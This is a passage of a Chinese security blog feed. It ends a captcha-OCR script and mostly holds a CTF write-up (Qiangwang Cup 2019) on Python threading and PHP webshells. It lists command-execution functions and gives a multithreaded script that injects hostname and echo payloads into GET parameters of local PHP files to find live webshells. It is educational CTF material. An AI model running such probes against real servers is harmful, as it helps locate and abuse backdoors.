keyword">if</span> len<span class="token punctuation">(</span>pixel_set<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">:</span>                change_pos<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 对相应位置进行像素修改，将噪声处的像素置为1（白色）</span>    <span class="token keyword">for</span> pos <span class="token keyword">in</span> change_pos<span class="token punctuation">:</span>        image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span>pos<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> image <span class="token comment" spellcheck="true"># 返回修改后的图片</span><span class="token comment" spellcheck="true"># 识别图片中的数字加字母</span><span class="token comment" spellcheck="true"># 传入参数为图片路径，返回结果为：识别结果</span><span class="token keyword">def</span> <span class="token function">OCR_lmj</span><span class="token punctuation">(</span>img_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 打开图片文件</span>    imgry <span class="token operator">=</span> image<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 转化为灰度图</span>    <span class="token comment" spellcheck="true"># 获取图片中的出现次数最多的像素，即为该图片的背景</span>    max_pixel <span class="token operator">=</span> get_threshold<span class="token punctuation">(</span>imgry<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 将图片进行二值化处理</span>    table <span class="token operator">=</span> get_bin_table<span class="token punctuation">(</span>threshold<span class="token operator">=</span>max_pixel<span class="token punctuation">)</span>    out <span class="token operator">=</span> imgry<span class="token punctuation">.</span>point<span class="token punctuation">(</span>table<span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 去掉图片中的噪声（孤立点）</span>    out <span class="token operator">=</span> cut_noise<span class="token punctuation">(</span>out<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#保存图片</span>    <span class="token comment" spellcheck="true"># out.save('E://figures/img_gray.jpg')</span>    <span class="token comment" spellcheck="true"># 仅识别图片中的数字</span>    <span class="token comment" spellcheck="true">#text = pytesseract.image_to_string(out, config='digits')</span>    <span class="token comment" spellcheck="true"># 识别图片中的数字和字母</span>    text <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>out<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 去掉识别结果中的特殊字符</span>    exclude_char_list <span class="token operator">=</span> <span class="token string">' .:\\|\'\"?![],()~@#$%^&amp;*_+-={};&lt;>/¥'</span>    text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> text <span class="token keyword">if</span> x <span class="token operator">not</span> <span class="token keyword">in</span> exclude_char_list<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> textOCR_lmj<span class="token punctuation">(</span><span class="token string">"2.jpg"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 验证码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python3多线程实例之批量检测webshell存活工具</title>
      <link href="/2019/05/27/python3-duo-xian-cheng-shi-li-zhi-pi-liang-jian-ce-webshell-cun-huo-gong-ju/"/>
      <url>/2019/05/27/python3-duo-xian-cheng-shi-li-zhi-pi-liang-jian-ce-webshell-cun-huo-gong-ju/</url>
      
        <content type="html"><![CDATA[<h3 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h3><p>前两天的强网杯，有个题目叫高明的黑客，核心任务就是从3000多个php文件中找到存活的webshell,大概每个php文件有几十个post,get的点，头天晚上跑了一晚上，自己太菜了，很多东西忘了考虑，结束后拿多线程跑了一下很快就出来了，所以记录一下教训吧，碰到需要大量人力，时间的脚本，应该先尽量优化，而不是跑了半天发现很慢再来改快一点，以此循环，黄花菜都凉了，果然犹豫就会败北</p><a id="more"></a><h3 id="一、python3多线程"><a href="#一、python3多线程" class="headerlink" title="一、python3多线程"></a>一、python3多线程</h3><h4 id="1-1、Python3-线程中常用的两个模块为："><a href="#1-1、Python3-线程中常用的两个模块为：" class="headerlink" title="1.1、Python3 线程中常用的两个模块为："></a>1.1、Python3 线程中常用的两个模块为：</h4><ul><li>_thread</li><li>threading</li></ul><h4 id="1-2、thread-模块已被废弃。用户可以使用-threading-模块代替。所以，在-Python3-中不能再使用”thread”-模块。为了兼容性，Python3-将-thread-重命名为-“-thread”。使用起来也很简单"><a href="#1-2、thread-模块已被废弃。用户可以使用-threading-模块代替。所以，在-Python3-中不能再使用”thread”-模块。为了兼容性，Python3-将-thread-重命名为-“-thread”。使用起来也很简单" class="headerlink" title="1.2、thread 模块已被废弃。用户可以使用 threading 模块代替。所以，在 Python3 中不能再使用”thread” 模块。为了兼容性，Python3 将 thread 重命名为 “_thread”。使用起来也很简单"></a>1.2、thread 模块已被废弃。用户可以使用 threading 模块代替。所以，在 Python3 中不能再使用”thread” 模块。为了兼容性，Python3 将 thread 重命名为 “_thread”。使用起来也很简单</h4><pre class=" language-python"><code class="language-python">_thread<span class="token punctuation">.</span>start_new_thread <span class="token punctuation">(</span> function<span class="token punctuation">,</span> args<span class="token punctuation">[</span><span class="token punctuation">,</span> kwargs<span class="token punctuation">]</span> <span class="token punctuation">)</span></code></pre><p>一个实例</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> _thread<span class="token keyword">import</span> time<span class="token comment" spellcheck="true"># 为线程定义一个函数</span><span class="token keyword">def</span> <span class="token function">print_time</span><span class="token punctuation">(</span> threadName<span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">:</span>   count <span class="token operator">=</span> <span class="token number">0</span>   <span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>delay<span class="token punctuation">)</span>      count <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"%s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span> threadName<span class="token punctuation">,</span> time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建两个线程</span><span class="token keyword">try</span><span class="token punctuation">:</span>   _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span> print_time<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"Thread-1"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>   _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span> print_time<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"Thread-2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Error: 无法启动线程"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token keyword">pass</span></code></pre><h4 id="1-3、-thread-提供了低级别的、原始的线程以及一个简单的锁，它相比于-threading-模块的功能还是比较有限的。"><a href="#1-3、-thread-提供了低级别的、原始的线程以及一个简单的锁，它相比于-threading-模块的功能还是比较有限的。" class="headerlink" title="1.3、_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。"></a>1.3、_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。</h4><h5 id="Thread类提供了以下方法"><a href="#Thread类提供了以下方法" class="headerlink" title="Thread类提供了以下方法:"></a>Thread类提供了以下方法:</h5><ul><li>threading.currentThread(): 返回当前的线程变量。</li><li>threading.enumerate(): 返回一个包含正在运行的线程的list</li><li>threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。<h5 id="除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法"><a href="#除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法" class="headerlink" title="除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:"></a>除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:</h5></li><li>run(): 用以表示线程活动的方法。</li><li>start():启动线程活动。</li><li><code>join([time]):</code> 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</li><li>isAlive(): 返回线程是否活动的。</li><li>getName(): 返回线程名。</li><li>setName(): 设置线程名。</li></ul><h4 id="1-4、最普通的使用多线程的方法"><a href="#1-4、最普通的使用多线程的方法" class="headerlink" title="1.4、最普通的使用多线程的方法"></a>1.4、最普通的使用多线程的方法</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">thread_job</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'This is Thread_job,number is %s'</span><span class="token operator">%</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    added_thread<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>thread_job<span class="token punctuation">)</span>    added_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>active_count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>enumerate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="1-5、使用join，和queue"><a href="#1-5、使用join，和queue" class="headerlink" title="1.5、使用join，和queue"></a>1.5、使用join，和queue</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span class="token keyword">def</span> <span class="token function">job</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">**</span><span class="token number">2</span>    q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">multithreading</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    q<span class="token operator">=</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    threads<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>job<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    results<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        results<span class="token punctuation">.</span>append<span class="token punctuation">(</span>q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    multithreading<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>返回结果</p><pre><code>[[1, 4, 9], [9, 16, 25], [16, 16, 16], [25, 25, 25]]</code></pre><h4 id="1-6、如果要使用线程同步"><a href="#1-6、如果要使用线程同步" class="headerlink" title="1.6、如果要使用线程同步"></a>1.6、如果要使用线程同步</h4><p>如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。</p><p>使用 Thread 对象的 Lock 和 Rlock 可以实现简单的线程同步，这两个对象都有 acquire 方法和 release 方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间。如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">class</span> <span class="token class-name">myThread</span> <span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> threadID<span class="token punctuation">,</span> name<span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>threadID <span class="token operator">=</span> threadID        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>counter <span class="token operator">=</span> counter    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"开启线程： "</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 获取锁，用于线程同步</span>        threadLock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>        print_time<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>counter<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 释放锁，开启下一个线程</span>        threadLock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_time</span><span class="token punctuation">(</span>threadName<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> counter<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> counter<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>delay<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"%s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>threadName<span class="token punctuation">,</span> time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        counter <span class="token operator">-=</span> <span class="token number">1</span>threadLock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 创建新线程</span>thread1 <span class="token operator">=</span> myThread<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Thread-1"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>thread2 <span class="token operator">=</span> myThread<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"Thread-2"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 开启新线程</span>thread1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>thread2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 添加线程到线程列表</span>threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread1<span class="token punctuation">)</span>threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread2<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 等待所有线程完成</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"退出主线程"</span><span class="token punctuation">)</span></code></pre><h3 id="二、php-webshell相关知识"><a href="#二、php-webshell相关知识" class="headerlink" title="二、php webshell相关知识"></a>二、php webshell相关知识</h3><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。<br>执行命令常用的函数有:</p><pre class=" language-php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'命令'</span>）<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'php code'</span><span class="token punctuation">)</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">'php code'</span><span class="token punctuation">)</span></code></pre><p>其他一些骚函数导致的php webshell<br>str_replace字符替换函数:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'pspypsptpepmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token shell-comment comment">#system</span></code></pre><p>create_fuction()创建匿名函数：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#create_function(</span><span class="token string">'参数列表'</span><span class="token punctuation">,</span> <span class="token string">'php代码字符串'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>总结：</p><ul><li>系统命令执行: system, passthru, shell_exec, exec, popen, proc_open</li><li>代码执行: eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13</li><li>文件包含: require, require_once, include, include_once, file_get_contents, file_put_contents, fputs, fwrite</li></ul><h3 id="三、暴力检验webshell存活"><a href="#三、暴力检验webshell存活" class="headerlink" title="三、暴力检验webshell存活"></a>三、暴力检验webshell存活</h3><p>回到本题，最开始不知道有这么多post，get点，所以拿D盾等工具，23333，所有文件全部被找到了，我估计这些工具就是单纯匹配这几个敏感函数和post,get点，为了确认是否存活我们需要在本地搭建这个服务，并且找到通用的回显来确定,因为我在windows上环境搭建的php code可以用<code>phpinfo()</code>或者<code>system(&#39;hostname&#39;);</code>前者更大所以倾向于后者,命令用<code>hostname</code>能拿到主机名称，反过来是不行的，（如果你用Linux服务器使用system(‘id’)能检验phpcode,id检验命令，</p><p><img src="1.png" alt=""><br>所以初期代码为（暂时只考虑了get请求的参数</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> requestsanswer <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'answer.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>filePath <span class="token operator">=</span> <span class="token string">'./src/'</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://localhost/src/"</span>file_count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">get_rep</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r_url <span class="token operator">=</span> url <span class="token operator">+</span> filename <span class="token operator">+</span>  <span class="token string">"?"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=hostname"</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>r_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'DESKTOP-CE0L9E5'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        answer<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: _GET[\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']\n"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: _GET[\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']"</span><span class="token punctuation">)</span>    r_url <span class="token operator">=</span> url <span class="token operator">+</span> filename <span class="token operator">+</span>  <span class="token string">"?"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=system('hostname');"</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>r_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'DESKTOP-CE0L9E5'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        answer<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: _GET[\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']\n"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Got It!   !!!!!!! "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">" The param is: _GET[\'"</span> <span class="token operator">+</span> name <span class="token operator">+</span><span class="token string">"\']"</span><span class="token punctuation">)</span><span class="token keyword">for</span> k <span class="token keyword">in</span> files<span class="token punctuation">:</span>    <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">'.DS_Store'</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">'index.html'</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filePath <span class="token operator">+</span> k<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        file_count<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已经完成: {:.2%}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>file_count<span class="token operator">/</span>len<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        get <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"GET\['(.+?)'\]"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#post = re.findall(r"POST\['(.+?)'\]", content)</span>           <span class="token keyword">for</span> i <span class="token keyword">in</span> get<span class="token punctuation">:</span>             <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'FileName：'</span><span class="token operator">+</span>k<span class="token operator">+</span><span class="token string">'  ParamName:'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>             get_rep<span class="token punctuation">(</span>k<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>answer<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>想了想有没有优化的地方，如果能找到一个phpcode和命令都能测试的一个通用函数就可以减少一半的网络请求，只要你找肯定是有的那就是<code>echo &#39;Hello Kitty&#39;;</code>我们会发现无论是phpcode还是system执行了就会有Hello Kitty的回显<br><img src="2.png" alt=""><br>所以get请求就可以修改为</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_rep</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    r_url <span class="token operator">=</span> url <span class="token operator">+</span> filename <span class="token operator">+</span>  <span class="token string">"?"</span> <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">"=echo 'Hello Kitty';"</span>    <span class="token comment" spellcheck="true">#print(r_url)</span>    rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>r_url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'Hello Kitty'</span> <span class="token keyword">in</span> rep<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        Record_To_File<span class="token punctuation">(</span>filename<span class="token punctuation">,</span>name<span class="token punctuation">)</span></code></pre><h3 id="四、多线程检验webshell存活"><a href="#四、多线程检验webshell存活" class="headerlink" title="四、多线程检验webshell存活"></a>四、多线程检验webshell存活</h3><p>现在只需要把上面的暴力脚本和多线程脚本结合一下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queuefile_count <span class="token operator">=</span> <span class="token number">0</span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/src/"</span>filePath <span class="token operator">=</span> <span class="token string">'./src/'</span>files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>filePath<span class="token punctuation">)</span>nameList<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#存储名字名称列表</span>nameSepList<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#存储分分离后的文件名称列表</span><span class="token comment" spellcheck="true">#把文件名存储起来 过滤拿到我们想要的文件后缀</span>threadLock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">global</span> start<span class="token keyword">def</span> <span class="token 